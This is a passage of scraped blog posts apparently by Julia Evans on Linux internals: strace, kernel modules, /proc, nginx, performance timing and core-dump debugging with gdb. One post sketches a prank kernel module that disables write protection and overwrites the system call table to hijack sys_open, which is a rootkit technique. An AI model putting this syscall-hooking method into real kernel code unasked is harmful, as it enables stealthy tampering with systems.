for high-level programming I’ve found  strace  and\n /proc . As far as I can tell ftrace and perf are mostly useful for\nlower-level programming. There’s also  tcpdump  and  lsof  and\n netstat  and all kinds of things I won’t go into here. \n\n Now you’re hopefully convinced that learning more about Linux is worth\nyour time. Let’s go over some strategies for understanding Linux\nbetter! \n\n Strategy 1: strace all the things! \n\n I mentioned  strace  before briefly.  strace  is literally my favorite\nprogram in the universe. A great way to get a better sense for what\nyour kernel is doing is – take a simple program that you understand\nwell (like  ls ), and run  strace  on it. \n\n This will show you at what points the program is communicating with\nyour kernel. I took a 13 hour train ride from Montreal to New York\nonce and\n straced killall  and\nit was REALLY FUN. Let’s try  ls ! \n\n I ran  strace -o out ls  to save the output to a file. strace will\noutput a\n WHOLE BUNCH OF CRAP .\nIt turns out that starting up a program is pretty complicated, and in\nthis case most of the system calls have to do with that. There’s a lot\nof \n\n \n opening libraries:  open(\"/lib/x86_64-linux-gnu/libc.so.6\",\nO_RDONLY|O_CLOEXEC) \n putting those libraries into memory:  mmap(NULL, 2126312,\nPROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7faf507fc000\n \n \n\n and a bunch of other things I don’t really understand. My main\nstrategy when stracing for fun is to ignore all the crap at the\nbeginning, and just focus on what I understand. It turns out that  ls \ndoesn’t need to do a lot! \n\n openat(AT_FDCWD, \".\", O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) = 3\ngetdents(3, /* 5 entries */, 32768)     = 136\ngetdents(3, /* 0 entries */, 32768)     = 0\nclose(3)                                = 0\nfstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 12), ...}) = 0\nmmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7faf5104a000\nwrite(1, \"giraffe  out  penguin\\n\", 22) = 22\nclose(1)                                = 0\nmunmap(0x7faf5104a000, 4096)            = 0\nclose(2)                                = 0\nexit_group(0)                           = ?\n \n\n This is awesome! Here’s what it needed to do: \n\n \n Open the current directory:  openat(AT_FDCWD, \".\",\nO_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) \n Get the contents of that directory:  getdents(3, /* 5 entries */,\n32768) = 136 . Looks like it was 136 bytes of stuff! \n Close the directory:  close(3) \n Write the files to standard out:  write(1, \"giraffe out penguin\\n\",\n22) = 22 \n Close a bunch of things to clean up. \n \n\n That was really simple, and we already learned a new system call! That\nmmap in the middle there? No idea what that does. But it’s totally\nfine! STRACE IS THE BEST. \n\n So! Running strace on random processes and looking up the\ndocumentation for system calls you don’t recognize is an easy way to\nlearn a ton! \n\n Warning :  Don’t  strace processes\nthat you actually need to run efficiently! strace is like putting a\nhuge stopsign in front of your process every time you use a system\ncall, which is  all the time . Brendan Gregg has a\n great post about strace which you should read .\nAlso you should probably read everything he writes. \n\n Strategy 2: Read some kernel code! \n\n Okay, let’s imagine that we’ve gotten interested in  getdents  (the\nsystem call to list the contents of a directory), and we want to\nunderstand better what it actually does. There’s this fantastic tool\ncalled  livegrep  that lets you search through\nkernel code. It’s by  Nelson Elhage  who\nis pretty great. \n\n So let’s use it to find the source for  getdents , which lists all the\nentries in a directory! I searched for it\nusing livegrep, and found\n the source . \n\n On line 211, it calls  iterate_dir . So let’s look that up! It’s\n here .\nHonestly this code makes no sense to me (maybe  res =\nfile->f_op->iterate(file, ctx)  is what’s iterating over the directory?). \n\n But it’s neat that we can look at it! \n\n If you want to know about current Linux kernel development,\n Linux Weekly News  is a great resource. For example,\nhere’s an interesting article about the\n btrfs filesystem! \n\n Strategy 3: Write a fun kernel module! \n\n Kernel modules sound intimidating but they’re actually really\napproachable! All a kernel module is fundamentally is \n\n \n An  init  function to run when the module is loaded \n A  cleanup  function to run when the module is unloaded \n \n\n You load kernel modules with  insmod  and unload them with  rmmod .\nHere’s a working “Hello world” kernel module! \n\n #include <linux/module.h>    // included for all kernel modules\n#include <linux/kernel.h>    // included for KERN_INFO\n#include <linux/init.h>      // included for __init and __exit macros\n\nstatic int __init hello_init(void)\n{\n    printk(KERN_INFO \"WOW I AM A KERNEL HACKERl!!!\\n\");\n    return 0;    // Non-zero return means that the module couldn't be loaded.\n}\n\nstatic void __exit hello_cleanup(void)\n{\n  printk(KERN_INFO \"I am dead.\\n\");\n}\n\nmodule_init(hello_init);\nmodule_exit(hello_cleanup);\n \n\n That’s it!  printk  writes to the system log, and if you run  dmesg ,\nyou’ll see what it printed! \n\n Let’s look at another fun kernel module! I gave a talk about kernel\nhacking at  CUSEC  in January, and I needed a\nfun example. My friend  Tavish  suggested\n“hey julia! What if you made a kernel module that rick rolls you every\ntime you open a file?” And my awesome partner\n Kamal  said “that sounds like fun!”\nand inside a weekend he’d totally done it! \n\n You can see the  extremely  well-commented source here:\n rickroll.c .\nBasically what it needs to do when loaded is \n\n \n find the system call table (it turns out this is not trivial!) \n Disable write protection so that we’re actually allowed to modify it\n(!!) \n Save the old  open  so we can put it back \n Replace the  open  system call with our own  rickroll_open  system\ncall \n \n\n That’s it! \n\n Here’s the relevant code: \n\n sys_call_table = find_sys_call_table();\nDISABLE_WRITE_PROTECTION;\noriginal_sys_open = (void *) sys_call_table[__NR_open];\nsys_call_table[__NR_open] = (unsigned long *) rickroll_open;\nENABLE_WRITE_PROTECTION;\nprintk(KERN_INFO \"Never gonna give you up!\\n\");\n \n\n The  rickroll_open  function is also pretty understandable. Here’s a\nsketch of it, though I’ve left out some important implementation\ndetails that you should totally read:  rickroll.c \n\n static char *rickroll_filename = \"/home/bork/media/music/Rick Astley - Never Gonna Give You Up.mp3\";\nasmlinkage long rickroll_open(const char __user *filename, int flags, umode_t mode) {\n    if(strcmp(filename + len - 4, \".mp3\")) {\n        /* Just pass through to the real sys_open if the extension isn't .mp3 */\n        return (*original_sys_open)(filename, flags, mode);\n    } else {\n        /* Otherwise we're going to hijack the open */ fd =\n        (*original_sys_open)(rickroll_filename, flags, mode); return\n        fd; } }\n \n\n SO FUN RIGHT. The source is super well documented and interesting and\nyou should\n go read it .\nAnd if you think “but Kamal must be a kernel hacking wizard! I could\nnever do that!“, it is not so! Kamal is pretty great, but he had never\nwritten kernel code before that weekend. I understand that he googled\nthings like “how to hijack system call table linux”. You could do the\nsame! \n\n Kernel modules are an especially nice way to start because writing toy\nkernel modules plays nicely into writing real kernel modules like\nhardware drivers. Or you could start out writing drivers right away!\nWhatever floats your boat :) The reference for learning about writing\ndrivers is called  Linux Device Drivers \nor “LDD3”. The fabulous\n Jessica McKellar  is writing the\nnew version, LDD4. \n\n Strategy 4: Write an operating system! \n\n This sounds really unapproachable! And writing a full-featured\noperating system from scratch is a  ton  of work. But the great\nthing about operating systems is that yours don’t need to be full-featured! \n\n I wrote a  small operating system \nthat basically only has a keyboard driver. And doesn’t compile for\nanyone except me. It was 3 weeks of work, and I learned SO MUCH.\nThere’s a  super great wiki  with\nlots of information about making operating system. \n\n A few of the blog posts that I wrote while working on it: \n\n \n Writing an OS in Rust in tiny steps \n After 5 days, my OS doesn’t crash when I press a key \n SOMETHING IS ERASING MY PROGRAM WHILE IT’S RUNNING (oh wait oops) \n \n\n I learned about linkers and bootloaders and interrupts and memory\nmanagement and how executing a program works and so many more things!\nAnd I’ll never finish it,\n and that’s okay . \n\n Strategy 5: Do the Eudyptula challenge \n\n If you don’t have an infinite number of ideas for hilarious kernel\nmodule pranks to play on your friends (I certainly don’t!), the\n Eudyptula Challenge  is specifically\nbuilt to help you get started with kernel programming, with\nprogressively harder steps. The first one is to just write a\n“hello world” kernel module, which is pretty straightforward! \n\n They’re pretty strict about the way you send email (helping you\npractice for the linux kernel mailing list, maybe!). I haven’t tried\nit myself yet, but  Alex Clemmer  tells me that\nit is hard but possible. Try it out! \n\n Strategy 6: Do an internship \n\n If you’re really serious about all this, there are a couple of\nprograms I know of: \n\n \n Google Summer of Code, for students \n The GNOME outreach program for women \n \n\n The GNOME outreach program for women (OPW) is a great program that\nprovides mentorship and a 3-month paid internship for women who would\nlike to contribute to the Linux kernel.\n More than 1000 patches \nfrom OPW interns and alumni have been accepted into the kernel. \n\n In the application you submit a simple patch to the kernel (!!), and\nit’s very well documented. You don’t need to be an expert, though you\ndo need to know some C. \n\n You can apply now!  The application deadline for the current round\nis October 31, 2014, and you can find more information on the\n kernel OPW website . \n\n Resources \n\n To recap, here are a few super useful resources for learning that I’ve\nmentioned: \n\n \n Previous writing:\n 4 paths to being a kernel hacker ,\neverything I’ve written about  kernels \n I learned all of this at  Hacker School \n LXR  and\n http://livegrep.com/  are great\nfor searching the Linux kernel \n Linux Device Drivers 3  is available\nfree online. \n The  OPW internship for the Linux kernel \n Linux Weekly News\n( here’s an index ) \n Brendan Gregg  has a ton of extremely\nuseful writing about performance analysis tools like  perf  and\n ftrace  on Linux. \n \n\n You can be a kernel hacker \n\n I’m not a kernel hacker, really. But now when I look at awesome actual\nkernel hackers like  Valerie Aurora  or\n Sage Sharp , I no longer think that\nthey’re wizards. I now think those are people who worked really hard\non becoming better at kernel programming, and did it for a long time!\nAnd if I spent a lot of time working on learning more, I could be a\nkernel hacker too. \n\n And so could you. \n"},
{"url": "https://jvns.ca/blog/2021/02/04/day-53--configuring-nginx/", "title": "Day 53: a little nginx, IPv6, and wireguard", "content": "\n     \n\n I spent the day on Wednesday trying to run my puzzle thing on fly.io. I got\npart of the way there and learned a few things along the way: \n\n miscellaneous IPv6 learning \n\n I’d never really used IPv6 before, and I learned that IPv6 address are often in\nsquare brackets. For example to get  rails  to listen on IPv6 addresses,\nI had to run: \n\n CMD [\"rails\", \"server\", \"-b\", \"[::]\"]\n \n\n CMD [\"rails\", \"server\", \"-b\", \"0.0.0.0\"]  will only listen on IPv4 addresses! \n\n But you don’t  always  seem to need square brackets, for example I ssh’d to an IPv6 address like this: \n\n ssh fdaa:0:bff:a7b:aa4:4c98:4224:2\n \n\n I think the rule might be that you need to use square brackets if you’re going\nto include a port, like  fade::5  port  53  is  [fade::5]:53 , because\notherwise it would be ambiguous whether the port is part of the IP address or\nnot. \n\n how to make nginx re-resolve DNS every time \n\n I learned that if you do \n\n proxy_pass http://some-website.com:2000;\n \n\n in an nginx configuration, nginx will resolve  some-website.com  to an IP\naddress once when it boots, and then never update again. This was not good\nbecause the IP addresses of my backends were changing all the time, so I needed\nto figure out how to get nginx to re-resolve DNS. \n\n Instead I needed to do something like this: \n\n location @rails {\n    resolver [fdaa::3];\n    set $backend \"http://rails.internal:8080\";\n    proxy_pass $backend;\n}\n \n\n It turns out that if you  proxy_pass  to something with a variable with it,\nnginx will resolve DNS. You also need to set a DNS server to use explicitly,\nnginx won’t use what’s in  /etc/resolv.conf . \n\n This actually still doesn’t work and I don’t know why, nginx. Maybe I’ll figure\nthat out today. \n\n setting up Wireguard seems easy \n\n I set up Wireguard for the first time and it was very straightforward! \n\n The other side I was connecting to was already set with Wireguard, so I just\nneeded to set up my laptop using the configuration they said to use. I just\nneeded to: \n\n \n do  apt-get install wireguard \n Download the Wireguard configuration file the other side wanted me to use and put it in  /etc/wireguard/fly.conf \n Run  wg-quick up fly \n done! \n \n\n"},
{"url": "https://jvns.ca/blog/2014/04/26/i-dont-feel-guilty-about-not-contributing-to-open-source/", "title": "Don't feel guilty about not contributing to open source", "content": "\n      For a long time I had a vague feeling that I  should  be contributing\nto open source more, and that it was in some way a Good Thing. And I\nfelt a little bit guilty about not doing it enough. \n\n I used to have this dialog with myself pretty often: \n\n \n Okay, Julia, open source is good! \n Yeah, I should go do some open source \n What project? I don’t know. huh. \n I use  Pidgin ! Maybe that \n go look at pidgin \n so many issues! I don’t even know where to start \n and it’s in C! so many code! how do I even! \n Give up, feel vaguely guilty \n \n\n \n\n I’m trying to stop feeling guilty. Now if I’m going to contribute to a\nproject, it needs to be something that I’m motivated to do.\n Mel Chua  gave a great talk at Hacker\nSchool where she said motivation is made up of  competence  (I know\nhow to do this!),  autonomy  (I can make my own decisions!), and\n relatedness  (I know why I’m doing this!). \n\n In open source there’s pretty high autonomy – nobody’s ever going to\nforce you to work on anything. So what’s usually missing is\n relatedness  and  competence . \n\n For relatedness, I’ll ask myself: \n\n “What do I hope to get out of contributing to this project? \n\n \n I want to know how it works! (contributing to Linux could be super\nfun for this reason! Operating systems are amazing! My\n gunzip in julia  is a project\nwhere I learned a ton.) \n I found a bug and I want to fix it! I want to add a feature! \n I want to build up a portfolio of programming work to get better\njobs! \n I think this project is doing important work and I’d like to advance\nit! (Kelsey Gilmore-Innis’s work on the\n Anti-Eviction Mapping Project \nis a great example) \n I like spending time with the people who work on this project! (When\nI went to Drupal conferences, all the Drupal devs were totally\nlovely people and really made me want to contribute to Drupal) \n \n\n For competence, I’ll ask: \n\n Is there anything that will stop me from getting work done? \n\n \n Do I know the language this is written in? Is it easy to learn? \n Can I set up a dev environment easily on my computer? \n How complex is the codebase? Is it approachable? Is the\ndocumentation good? \n If I don’t know something I need to know, will the community answer\nmy questions? Will they be jerks? Is the mailing list active? \n \n\n why I don’t \n\n I usually don’t contribute to open source because of  relatedness  –\nI don’t know what I’ll get out of it! A super great example of this is\nDrupal.  Drupal  is a tremendously important\nproject. I’ve contributed to it before! I could do it again! The\ncommunity is extraordinarily welcoming! But it’s missing  relatedness \nfor me right now – I’m not developing websites anymore. \n\n Most open source projects fails relatedness – if I don’t use it,\ndon’t want to learn about it right now, don’t know anyone who works on\nit, and/or don’t believe strongly in its mission, I probably don’t\nwant to contribute! This is TOTALLY OKAY. There are tons of people who\nare contributing to those projects! They will be okay without me =) \n\n A great example of a project that fails competence is Pidgin, above –\nI might have had some issue with my chat client that I wanted to fix,\nbut the barrier to entry seemed too high at the time. \n\n why I do! \n\n Here are some open source-y projects I have worked on and why: \n\n \n IPython , because there was a\nfeature I wanted it to have that it didn’t! Now it does! One of my\nPRs got merged into IPython and it is SUPER COOL. \n A  pandas cookbook ,\nbecause when I learned pandas there weren’t as many practical\nmaterials as I wanted! Now there’s one more! People are learning\nmore about pandas because I wrote a thing! THE BEST. \n gzip in julia , to learn how gzip\nworked. Now I know! AWESOME. \n \n\n Working on open source projects can be super fun! Yay! \n\n don’t feel guilty \n\n There are so many things you could be doing. If it takes 30 hours of\nyour time over 3 weeks to fix a network card issue, maybe that’s\nworthwhile because you learned a lot and your hardware works better!\nOr maybe you would rather spend that time with your family or friends\nor volunteering or playing soccer or watching movies or working to pay\nyour rent. \n\n I sometimes hear people say “you should write open source software!”\nlike it’s a universal good. Don’t. Do it if it makes sense for you! Do\nit if you know what you’ll get out of it, and you feel that it’s worth\nyour time! If not, do other things instead! \n"},
{"url": "https://jvns.ca/blog/2014/03/23/recovering-files-using-slash-proc-and-other-useful-facts/", "title": "Recovering files using /proc (and spying, too!)", "content": "\n      I’ve had a vague idea for years that /proc was a way the Linux kernel\nexposed its internals, and that I could look there to find things. \n\n Then I learned this: \n\n TIL!!! If you\naccidentally delete a file that a process still has open, you can\nrecover it with cat /proc/$pid/fd/$file_descriptor. so\neasy! — Julia Evans (@b0rk)  March 19,\n2014 \n\n Suddenly it was like  /proc  was turned into a magical unicorn! I can\nuse it to recover my files?! ★★Amazing★★. \n\n Let’s explain why this works. When a process opens a file (including\nsockets), it gets a  file descriptor  for that file, which is a number\nstarting at 0. \n\n \n\n File descriptors and investigations on std{in,out,err} \n\n 0, 1, and 2 are always the stdin, stdout, and stderr of the process.\nFor example, if I look at the file descriptors for a Google Chrome\nprocess I have, I see: \n\n \n$ ls /proc/4076/fd\n0  10  12  14  16  18  2   21  23  26  28  3   31  34  36  38  4   41  43  5   6  72  8\n1  11  13  15  17  19  20  22  25  27  29  30  32  35  37  39  40  42  44  53  7  74  9\n \n\n That’s pretty opaque! Let’s take a closer look. \n\n \n$ ls -l /proc/4076/fd/{0,1,2}\nlr-x------ 1 bork bork 64 Mar 22 22:38 /proc/4076/fd/0 -> /dev/null\nl-wx------ 1 bork bork 64 Mar 22 22:38 /proc/4076/fd/1 -> /dev/null\nl-wx------ 1 bork bork 64 Mar 22 22:38 /proc/4076/fd/2 -> /home/bork/.xsession-errors\n \n\n Neat, the numbers 0, 1, and 2 are just symbolic links! It looks like\nChrome doesn’t have any stdin or stdout, which makes sense, but the\nstderr is  /home/bork/.xsession-errors . I didn’t know that! It turns\nout this is also a great way to find out where a process that you\ndidn’t start is redirecting its output. \n\n Where else do my programs redirect their stderr? Let’s see! I looked\nat everything’s stderr, got awk to pull out just the file, and ran\n uniq  to get the counts. \n\n \n$ ls -l /proc/*/fd/2 | awk '{print $11}' | sort | uniq -c\n      42 /dev/null\n      2 /dev/pts/0\n      1 /dev/pts/1\n      3 /dev/pts/2\n      2 /dev/pts/3\n      2 /dev/pts/4\n      5 /dev/pts/5\n      1 /dev/pts/7\n     25 /home/bork/.xsession-errors\n \n\n So mostly /dev/null, some of them are running on terminals\n( /dev/pts/* ), and the rest to  ~/.xsession-errors . No huge\nsurprises here. \n\n What else could we use these file descriptors for? Someone on Twitter\nsuggested this: \n\n @b0rk  When I was\nmaking my first Tarsnap backup, I used `readlink\n/proc/<TARSNAP>/fd/7` in a loop to find out what file it was\non.  — Matthew Frazier (@LeafStorm)  March\n23, 2014 \n\n This works because when you open different files again and again in a\nloop, it will usually end up with the same file descriptor. You could\nalso do the same thing by running  strace -etrace=open -p$TARSNAP_PID \nto see which files Tarsnap is opening. \n\n Okay, now we know that we can use /proc to learn about our processes’\nfiles! What else? \n\n Spy on your processes with /proc/$pid/status \n\n If you look at the file  /proc/$pid/status , you can find out all\nsorts of information about your processes! You can look at this for\nany process. \n\n Here’s a sample of what’s in that file: \n\n \nName:   chrome\nGroups: 4 20 24 27 30 46 104 109 124 1000 \nVmPeak:   853984 kB\nVmSize:   670392 kB\nVmData:   323264 kB\nVmExe:     96100 kB\nThreads:        3\nCpus_allowed_list:      0-7\n \n\n So we can see there’s some information about the memory, its name, its\ngroups, its threads, and which CPUs it’s allowed to run on. \n\n But wait! We could have found out a lot of this information with  ps\naux . How does  ps  do it? Let’s find out! \n\n \n$ strace -f -etrace=open ps aux\n...\nopen(\"/proc/30219/stat\", O_RDONLY)      = 6\nopen(\"/proc/30219/status\", O_RDONLY)    = 6\nopen(\"/proc/30219/cmdline\", O_RDONLY)   = 6\n...\n \n\n So  ps  gets its information from  /proc ! Neat. \n\n I’m sold. What else is there?!! \n\n I tweeted asking for suggestions of things to find in  /proc/ , and\nsomeone replied linking to the\n /proc man page . I thought they were\ntrolling me, but then I clicked on it and it was actually useful! \n\n A few more things I need to investigate: \n\n \n the  procps  and  sysstat  utilities \n a ton of wonderful suggestions by Keegan McAllister on the\n Ksplice blog \n(including how to force a program to take stdin if it doesn’t take\nstdin) \n /sys  replaces part of  /proc ’s functionality. \n Plan 9 / Inferno took this “everything is a file” business even more\nseriously than Linux does \n debugfs  / ftrace.\n An example someone linked to. \n \n\n I still feel like there are concrete uses for  /proc/  that I don’t\nknow about, though. What are they? \n\n \n"},
{"url": "https://jvns.ca/blog/2014/05/12/computers-are-fast/", "title": "Computers are *fast*!", "content": "\n      So I have a computer. My computer contains hardware (like a CPU! RAM!\nL1/L2 caches!) But I don’t understand very well how fast that hardware\nis, what tools I have to profile it, and how much of the time that my\nprograms are running is split between RAM/the hard disk/the CPU. \n\n So today I paired with\n Sasha Laundy , and we ran Serious\nInvestigations into how fast my computer can process a 1GB file. \n\n The objects: \n\n \n An episode of The Newsroom (1GB) \n A task: add up all the bytes (mod 256) \n \n\n This was basically the easiest task that I could think of that\ninvolved processing the entire file (so nothing gets optimized out by\nthe compiler). \n\n \n\n Step 1: Write a program to add up all the bytes \n\n I wrote a small C program to add up all the bytes in a file. It’s\ncalled\n bytesum.c .\nIt reads the file in chunks of 64k, and then adds up all the bytes\ninto a char. \n\n This runs pretty fast! I compiled it with  gcc -Ofast  (to make it\nFASTER!) and it added up all the bytes in \n\n \n 2.5 seconds (the first time I ran the program) \n 0.6 seconds (the second time I ran the program, because it’s already\nloaded into RAM) \n \n\n I take this to mean that it takes 2s to read the file into memory (I\nhave a SSD in my computer, so 500MB/s makes sense), and then 0.6s to\ndo the actual adding-up-of-the bytes. Awesome! We now know that I can\nread from my hard drive at 500MB/s. \n\n Step 2: try to use  mmap  to make it faster \n\n This is a pretty boring step. We made it use  mmap  instead (see\n bytesum_mmap.c ),\nin the hopes that it would make it faster. It took exactly the same\namount of time. NEXT. \n\n Step 3: use vector intrinsics!!! \n\n Then I went and talked to  James Porter , and\nhe told me that CPUs have special instructions for doing multiple\nadditions at once, and that I could maybe use them to optimize my\nprogram! So I googled “vector intrinsics”, copied some code from Stack\nOverflow, and ended up with a new version:\n bytesum_intrinsics.c .\nI timed it, and it took  0.25 seconds !!! \n\n So our program now runs  twice as fast , and we know a whole bunch\nof new words (SSE! SIMD! vector intrinsics!) \n\n Step 4: Make it slow. \n\n Now that we’ve written a super fast program, I wanted to understand\nthe CPU caches better. What if we engineered a whole bunch of cache\nmisses? I wrote a new version of  bytesum_mmap.c  that added up all\nthe bytes in an irregular way – instead of going through all the\nbytes in order, it would skip from byte 1 to 2001 to 3001 to 4001 and\nthen loop around and access 2, 2002, 3002, …, 100002. As you might\nimagine, this isn’t very efficient. \n\n You can see the code for this in\n bytesum_stride.c .\nI ran it with  ./bytesum_stride *.mp4 60000 , and it took about 20\nseconds. So we’ve learned that  cache misses can make your code 40\ntimes slower . \n\n Step 5: where do the 0.25 seconds come from??? \n\n I still didn’t totally understand exactly how my super fast vector\nintrinsic program’s performance broke down, though: how much of that\n0.25 seconds was spent doing memory accesses, and how much in\nnumerical computation? James suggested using\n Marss  which will\napparently give you unlimited amounts of information, but I spent a\nfew minutes trying to get it to work and failed. \n\n So instead I used  perf , which is a  totally magical  performance\nmeasurement tool for Linux. I needed to upgrade my kernel first, which\nwas a bit nervewracking. But I did it! And it was beautiful. There are\ncolours, and we got it to annotate the assembly code with performance\nstatistics. Here’s what I ran to do it: \n\n \nperf record ./bytesum_intrinsics The\\ Newsroom\\ S01E04.mp4\nperf annotate --no-source\n \n\n And here’s the result: \n\n \n\n The  movdqa  instructions have to do with accessing memory, and it\nspends 32% of its time on those instructions. So I  think  that means\nthat it spends 32% of its time accessing RAM, and the other 68% of its\ntime doing calculations. Super neat! \n\n There are still a lot of things I don’t understand here – are my\nconclusions about this program correct? Are there further things I\ncould be doing to optimize this? \n\n I’m also kind of amazed by how fast C is. I’m used to writing in\ndynamic programming languages, which definitely do not process 1GB\nfiles in 0.25 seconds. Fun! \n"},
{"url": "https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/", "title": "How to get a core dump for a segfault on Linux", "content": "\n     \n\n This week at work I spent all week trying to debug a segfault. I’d never done this before, and some\nof the basic things involved (get a core dump! find the line number that segfaulted!) took me a long\ntime to figure out. So here’s a blog post explaining how to do those things! \n\n At the end of this blog post, you should know how to go from “oh no my program\nis segfaulting and I have no idea what is happening” to “well I know what its\nstack / line number was when it segfaulted, at least!“. \n\n what’s a segfault? \n\n A “segmentation fault” is when your program tries to access memory that it’s not allowed to access,\nor tries to .\nThis can be caused by: \n\n \n trying to dereference a null pointer (you’re not allowed to access the memory address  0 ) \n trying to dereference some other pointer that isn’t in your memory \n a C++ vtable pointer that got corrupted and is pointing to the wrong place, which causes the\nprogram to try to execute some memory that isn’t executable \n some other things that I don’t understand, like I think misaligned memory accesses can also\nsegfault \n \n\n This “C++ vtable pointer” thing is what was happening to my segfaulting program. I might explain that\nin a future blog post because I didn’t know any C++ at the beginning of this week and this vtable\nlookup thing was a new way for a program to segfault that I didn’t know about. \n\n But! This blog post isn’t about C++ bugs. Let’s talk about the basics, like, how do we even get a\ncore dump? \n\n step 1: run valgrind \n\n I found the easiest way to figure out why my program is segfaulting was to use valgrind: I ran \n\n valgrind -v your-program\n \n\n and this gave me a stack trace of what happened. Neat! \n\n But I also wanted to do a more in-depth investigation and find out more than just what\nvalgrind was telling me! So I wanted to get a core dump and explore it. \n\n How to get a core dump \n\n A  core dump  is a copy of your program’s memory, and it’s useful when you’re trying to debug what\nwent wrong with your problematic program. \n\n When your program segfaults, the Linux kernel will sometimes write a core dump to disk. When I\noriginally tried to get a core dump, I was pretty frustrated for a long time because – Linux wasn’t\nwriting a core dump!! Where was my core dump???? \n\n Here’s what I ended up doing: \n\n \n Run  ulimit -c unlimited  before starting my program \n Run  sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t \n \n\n ulimit: set the max size of a core dump \n\n ulimit -c  sets the  maximum size of a core dump . It’s often set to 0, which means that the\nkernel won’t write core dumps at all. It’s in kilobytes. ulimits are  per process  – you can see\na process’s limits by running  cat /proc/PID/limit \n\n For example these are the limits for a random Firefox process on my system: \n\n $ cat /proc/6309/limits \nLimit                     Soft Limit           Hard Limit           Units     \nMax cpu time              unlimited            unlimited            seconds   \nMax file size             unlimited            unlimited            bytes     \nMax data size             unlimited            unlimited            bytes     \nMax stack size            8388608              unlimited            bytes     \nMax core file size        0                    unlimited            bytes     \nMax resident set          unlimited            unlimited            bytes     \nMax processes             30571                30571                processes \nMax open files            1024                 1048576              files     \nMax locked memory         65536                65536                bytes     \nMax address space         unlimited            unlimited            bytes     \nMax file locks            unlimited            unlimited            locks     \nMax pending signals       30571                30571                signals   \nMax msgqueue size         819200               819200               bytes     \nMax nice priority         0                    0                    \nMax realtime priority     0                    0                    \nMax realtime timeout      unlimited            unlimited            us   \n \n\n The kernel uses the  soft limit  (in this case, “max core file size = 0”) when deciding how big of\na core file to write. You can increase the soft limit up to the hard limit using the  ulimit  shell\nbuiltin ( ulimit -c unlimited !) \n\n kernel.core_pattern: where core dumps are written \n\n kernel.core_pattern  is a kernel parameter or a “sysctl setting” that controls where the Linux\nkernel writes core dumps to disk. \n\n Kernel parameters are a way to set  global  settings on your system.  You can get a list of every\nkernel parameter by running  sysctl -a , or use  sysctl kernel.core_pattern  to look at the\n kernel.core_pattern  setting specifically. \n\n So  sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t  will write core dumps to  /tmp/core-<a bunch of stuff identifying the process> \n\n If you want to know more about what these  %e ,  %p  parameters read, see  man core . \n\n It’s important to know that  kernel.core_pattern  is a global settings – it’s good to be a little\ncareful about changing it because it’s possible that other systems depend on it being set a certain\nway. \n\n kernel.core_pattern & Ubuntu \n\n By default on Ubuntu systems, this is what  kernel.core_pattern  is set to \n\n $ sysctl kernel.core_pattern\nkernel.core_pattern = |/usr/share/apport/apport %p %s %c %d %P\n \n\n This caused me a lot of confusion (what is this apport thing and what is it doing with my core\ndumps??) so here’s what I learned about this: \n\n \n Ubuntu uses a system called “apport” to report crashes in apt packages \n Setting  kernel.core_pattern=|/usr/share/apport/apport %p %s %c %d %P  means that core dumps will\nbe piped to  apport \n apport has logs in /var/log/apport.log \n apport by default will ignore crashes from binaries that aren’t part of an Ubuntu packages \n \n\n I ended up just overriding this Apport business and setting  kernel.core_pattern  to  sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t  because I was on a dev machine, I didn’t care whether Apport was working on not, and I didn’t feel like trying to convince Apport to give me my core dumps. \n\n So you have a core dump. Now what? \n\n Okay, now we know about ulimits and  kernel.core_pattern  and you have actually have a core dump\nfile on disk in  /tmp . Amazing! Now what??? We still don’t know why the program segfaulted! \n\n The next step is to open the core file with  gdb  and get a backtrace. \n\n Getting a backtrace from gdb \n\n You can open a core file with gdb like this: \n\n $ gdb -c my_core_file\n \n\n or maybe \n\n $ gdb executable -c my_core_file\n \n\n Next, we want to know what the stack was when the program crashed. Running  bt  at\nthe gdb prompt will give you a backtrace. In my case gdb hadn’t loaded symbols for the binary, so it\nwas just like  ?????? . Luckily, loading symbols fixed it. \n\n Here’s how to load debugging symbols. \n\n symbol-file /path/to/my/binary\nsharedlibrary\n \n\n This loads symbols from the binary and from any shared libraries the binary uses. Once I did that,\ngdb gave me a beautiful stack trace with line numbers when I ran  bt !!! \n\n If you want this to work, the binary should be compiled with debugging symbols. Having line numbers\nin your stack traces is extremely helpful when trying to figure out why a program crashed :) \n\n look at the stack for every thread \n\n Here’s how to get the stack for every thread in gdb! \n\n thread apply all bt full\n \n\n gdb + core dumps = amazing \n\n If you have a core dump & debugging symbols and gdb, you are in an amazing situation!! You can go up\nand down the call stack, print out variables, and poke around in memory to see what happened. It’s\nthe best. \n\n If you are still working on being a gdb wizard, you can also just print out the stack trace with\n bt  and that’s okay :) \n\n ASAN \n\n Another path to figuring out your segfault is to do one compile the program with AddressSanitizer\n(“ASAN”) ( $CC -fsanitize=address ) and run it.  I’m not going to discuss that in this post because\nthis is already pretty long and anyway in my case the segfault disappeared with ASAN turned on for\nsome reason, possibly because the ASAN build used a different memory allocator (system malloc\ninstead of tcmalloc). \n\n I might write about ASAN more in the future if I ever get it to work :) \n\n getting a stack trace from a core dump is pretty approachable! \n\n This blog post sounds like a lot and I was pretty confused when I was doing it but really there\naren’t all that many steps to getting a stack trace out of a segfaulting program: \n\n \n try valgrind \n \n\n if that doesn’t work, or if you want to have a core dump to investigate: \n\n \n make sure the binary is compiled with debugging symbols \n set  ulimit  and  kernel.core_pattern  correctly \n run the program \n open your core dump with  gdb , load the symbols, and run  bt \n try to figure out what happened!! \n \n\n I was able using gdb to figure out that there was a C++ vtable entry that is pointing to some\ncorrupt memory, which was somewhat helpful and helped me feel like I understood C++ a bit better.\nMaybe we’ll talk more about how to use gdb to figure things out another day! \n\n"},
